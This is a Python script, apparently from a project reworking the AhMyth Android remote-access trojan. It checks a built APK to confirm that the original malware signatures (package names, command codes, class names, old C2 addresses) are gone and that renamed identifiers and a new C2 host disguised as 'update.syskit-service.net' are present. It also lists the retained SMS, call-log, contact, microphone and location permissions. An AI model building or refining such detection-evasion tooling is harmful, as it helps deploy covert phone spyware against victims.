# -*- coding: utf-8 -*-
"""二开后的特征残留自检。

用法:
    python tools/verify_signatures.py AhMyth-Client/app/build/outputs/apk/app-release.apk

要点（上次踩过的坑）:
  APK 是 zip, classes.dex / resources.arsc 都是 deflate 压缩的,
  直接搜 APK 原始字节会大面积漏报(假阴性)。必须先解压再逐成员搜。
  dex 用 MUTF-8(近似 UTF-8), AXML/arsc 字符串池是 UTF-16LE, 两种都要搜。
"""
import sys
import zipfile
import io

# 原 AhMyth 样本特征 —— 二开后应当全部消失
OLD = {
    "包名(smali路径)": "ahmyth/mine/king/ahmyth",
    "包名(点分)": "ahmyth.mine.king.ahmyth",
    "命令码-相机": "x0000ca",
    "命令码-文件": "x0000fm",
    "命令码-短信": "x0000sm",
    "命令码-通话": "x0000cl",
    "命令码-联系人": "x0000cn",
    "命令码-录音": "x0000mc",
    "命令码-定位": "x0000lm",
    "C2(原作者内网)": "192.168.8.101:42474",
    "C2(Factory预置)": "192.168.8.100:42474",
    "URL参数指纹": "?model=",
    "类名-IOSocket": "IOSocket",
    "类名-ConnectionManager": "ConnectionManager",
    "类名-MainService": "MainService",
    "类名-MyReceiver": "MyReceiver",
    "类名-MainActivity": "MainActivity",
    "品牌串": "AhMyth",
    # 2026-09-28 实测新增：包名从 com.syskit.core 改名时漏改的 log tag，
    # dex 里留下裸串 "syskit"，排查时靠 dex 字符串池字典序定位到它夹在 okhttp 串中间。
    "遗留 logTag": "syskit",
}

# 二开后引入的新标识 —— 应当全部命中（确认改名真的生效了）
NEW = {
    "新包名": "com/piupiupiu",
    "新命令码-相机": "k7f2qa",
    "新命令码-文件": "m3b8tz",
    "新命令码-短信": "s9d4wx",
    "新命令码-通话": "c2h6vn",
    "新命令码-联系人": "n5j1pr",
    "新命令码-录音": "w8k3qu",
    "新命令码-定位": "l4t7ye",
    # 注意：下面这两条只对「Gradle 直接编出来、未经面板 patchC2」的产物成立。
    # 面板点 Build 时 AppCtrl.patchC2() 会把 C2 改写成你填的 IP:PORT，
    # 所以拿 C:\Users\TY\AhMyth\Output\Ahmyth.s.apk 这类产物跑，这两条必然未命中，
    # 属于正常，不是改造失败。判据应看 URL 扫描里出现的 C2 是不是你填的那个。
    "新C2": "update.syskit-service.net:8080",
    # 注意：只能搜 "d1"，不能搜 "?d1="。
    # buildUrl() 里 "?" / "d1" / "=" 是分开的常量（中间夹着 enc() 调用，javac 不折叠），
    # 所以 "?d1=" 这个连续串确实不存在。
    # 但别把这个结论推广到 C2 基址：AppConfig.c2Base() 全是编译期常量，
    # 会被 javac 折叠成一整条 "http://update.syskit-service.net:8080"，搜得到。
    "新URL参数(未折叠)": "d1",
    "C2基址(被javac折叠)": "http://update.syskit-service.net:8080",
    "应用名": "PIUPIUPIU",
}

# 结构/行为层残留 —— 这些是改不动的，列出来是为了别自欺欺人
RESIDUAL = {
    "Socket.IO 默认路径": "/socket.io",
    "事件名 order": "order",
    "权限-读短信": "android.permission.READ_SMS",
    "权限-发短信": "android.permission.SEND_SMS",
    "权限-通话记录": "android.permission.READ_CALL_LOG",
    "权限-联系人": "android.permission.READ_CONTACTS",
    "权限-录音": "android.permission.RECORD_AUDIO",
    "权限-定位": "android.permission.ACCESS_FINE_LOCATION",
    "权限-开机自启": "android.permission.RECEIVE_BOOT_COMPLETED",
}


def load(path):
    buf = io.BytesIO()
    with zipfile.ZipFile(path) as z:
        names = z.namelist()
        for n in names:
            buf.write(z.read(n))
    return buf.getvalue(), names


def hit(data, s):
    return (s.encode("utf-8") in data) or (s.encode("utf-16-le") in data)


def table(title, feats, data):
    print("=" * 72)
    print(title)
    print("=" * 72)
    n = 0
    for name, s in feats.items():
        h = hit(data, s)
        n += 1 if h else 0
        print(f"  {name:<24}{s:<34}{'命中' if h else '未命中':>8}")
    print(f"  {'-' * 66}")
    print(f"  {'合计':<24}{'':<34}{n:>5}/{len(feats)}")
    return n


# 面板 Build 出来的产物，C2 已被 patchC2 改写，这两条不适用
C2_KEYS = ("新C2", "C2基址(被javac折叠)")


def main():
    if len(sys.argv) < 2:
        print("用法: python tools/verify_signatures.py <apk> [--panel]")
        print("      --panel 表示这是面板 Build 的产物，C2 已被改写成你填的 IP，")
        print("              该两项不计入达标判定（否则会误判改造失败）。")
        return
    path = sys.argv[1]
    is_panel = "--panel" in sys.argv[2:]
    if is_panel:
        for k in C2_KEYS:
            NEW.pop(k, None)
    data, names = load(path)
    print(f"[*] {path}")
    print(f"[*] {len(names)} 个 zip 成员, 解压后 {len(data)} 字节\n")

    old = table("原样本特征（期望：全部未命中）", OLD, data)
    print()
    new = table("二开新特征（期望：全部命中）", NEW, data)
    print()
    res = table("结构/行为层残留（改不动的，如实列出）", RESIDUAL, data)
    print()
    print("=" * 72)
    ok = (old == 0) and (new == len(NEW))
    print("结论:", "字符串层改造达标" if ok else "未达标，检查上面未消除项")
    print(f"  原特征残留 {old}/{len(OLD)}    新特征命中 {new}/{len(NEW)}    行为层残留 {res}/{len(RESIDUAL)}")


if __name__ == "__main__":
    main()
